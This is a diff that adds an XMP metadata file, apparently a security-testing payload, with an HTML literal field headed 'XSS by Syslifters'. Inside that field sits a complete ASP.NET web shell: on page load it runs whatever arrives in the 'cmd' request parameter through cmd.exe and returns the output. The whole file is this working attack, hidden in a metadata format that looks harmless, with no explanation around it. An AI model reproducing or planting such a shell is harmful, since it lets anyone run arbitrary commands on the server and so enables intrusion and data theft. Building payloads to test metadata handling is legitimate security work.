@@ -1,0 +1,38 @@
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+           xmlns:dc="http://purl.org/dc/elements/1.1/"
+           xmlns:xh="http://example.com/ns/xh/1.0/">
+    <rdf:Description rdf:about="">
+      <dc:description>
+        <rdf:Alt>
+          <rdf:li xml:lang="x-default">XMP with HTML literal</rdf:li>
+        </rdf:Alt>
+      </dc:description>
+      <xh:snippet rdf:parseType="Literal">
+        <h1>XSS by Syslifters</h1>
+        <%@ Page Language="C#" %>
+<script runat="server">
+    protected void Page_Load(object sender, EventArgs e) {
+        string cmd = Request["cmd"];
+        if (!string.IsNullOrEmpty(cmd)) {
+            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
+            psi.RedirectStandardOutput = true;
+            psi.RedirectStandardError = true;
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+
+            System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi);
+            string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+            p.WaitForExit();
+            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
+        } else {
+            Response.Write("No command specified. Use ?cmd=whoami");
+        }
+    }
+</script>
+
+      </xh:snippet>
+    </rdf:Description>
+  </rdf:RDF>
+</x:xmpmeta>
+
